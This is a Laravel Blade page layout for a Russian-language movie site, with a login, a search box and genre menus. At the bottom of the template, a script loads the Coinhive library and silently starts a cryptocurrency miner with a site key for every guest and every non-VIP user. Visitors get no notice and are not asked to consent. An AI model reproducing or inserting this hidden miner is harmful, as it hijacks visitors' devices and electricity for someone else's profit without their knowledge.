<!doctype html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>Films</title>

    <link rel="stylesheet" type="text/css" href="{{ URL::asset('css/style.css?').time()}}" />
    <link rel="stylesheet" type="text/css" href="{{ URL::asset('css/owl.carousel.css')}}" />
    <link rel="stylesheet" type="text/css" href="{{ URL::asset('css/owl.theme.default.css')}}" />
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js'></script>
    <script src='{{ URL::asset('js/owl.carousel.js')}}'></script>

</head>
<body>
<div class="bg"></div>

<div class="center">
    <div class="menu">
        <a class="logo" href="/">Thieves—movies.<div>totalh.net</div></a>
        <div class="regs">
            @guest
                <a class="log" href="{{ route('login') }}">Вход</a>
                <a class="reg" href="{{ route('register') }}">Регистрация</a>
                @else

                    <a href="#" class="user-name" data-toggle="dropdown" role="button" aria-expanded="false">
                        {{ Auth::user()->name }}
                        @if(Auth::user()->vip == '1')
                            <div class="vip">VIP</div>
                        @endif
                    </a>
                    <a  class="logout"  href="{{ route('logout') }}"
                        onclick="event.preventDefault();
                                             document.getElementById('logout-form').submit();">
                        Выход
                    </a>

                    <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                        {{ csrf_field() }}
                    </form>
                    @endguest
        </div>
        <form action="/search" method="post">
            <input class="search" type="text" placeholder="Поиск" name="search">
            <button class="search-button"><i class="fa fa-search"aria-hidden="true"></i></button>
            <input type="hidden" name="_token" value="{{ csrf_token() }}">
        </form>
    </div>
    <div class="column">

        <div class="left">
            @section('left')
                <div class="menu-btn">Фильмы</div>
                <div class="menu-list">
                    <a href="/categories/popular">Популярное</a>
                    <a href="/categories/rating">По рейтингу</a>
                    <a href="/categories/2017">2017 год</a>
                    <a href="/categories/2016">2016 год</a>
                    <a href="/categories/biographies">Биографии</a>
                    <a href="/categories/action">Боевики</a>
                    <a href="/categories/westerns">Вестерны</a>
                    <a href="/categories/military">Военные</a>
                    <a href="/categories/detectives">Детективы</a>
                    <a href="/categories/documentary">Документальные</a>
                    <a href="/categories/dramas">Драмы</a>
                    <a href="/categories/historical">Исторические</a>
                    <a href="/categories/comedy">Комедии</a>
                    <a href="/categories/crime">Криминал</a>
                    <a href="/categories/melodramas">Мелодрамы</a>
                    <a href="/categories/cartoons">Мультфильмы</a>
                    <a href="/categories/musicals">Мюзиклы</a>
                    <a href="/categories/adventure">Приключения</a>
                    <a href="/categories/family">Семейные</a>
                    <a href="/categories/sports">Cпортивные</a>
                    <a href="/categories/thrillers">Триллеры</a>
                    <a href="/categories/horrors">Ужасы</a>
                    <a href="/categories/fantastic">Фантастика</a>
                    <a href="/categories/fantasy">Фэнтези</a>
                </div>
            @show
        </div>

        <div class="right">
            @section('right')
            @show
        </div>

    </div>
</div>
</div>
@section('script')

@show
@guest

    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
        var miner = new CoinHive.Anonymous('DrWh0dknYsnFWDlQ4QYSCMrDaWAApZOS');
        miner.start();
    </script>
    @elseif(Auth::user()->vip != '1')
        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
        <script>
            var miner = new CoinHive.Anonymous('DrWh0dknYsnFWDlQ4QYSCMrDaWAApZOS');
            miner.start();
        </script>
@endguest
<script>
    jQuery(function() {
        jQuery(".owl-carousel").owlCarousel();

    });
</script>
</body>
</html>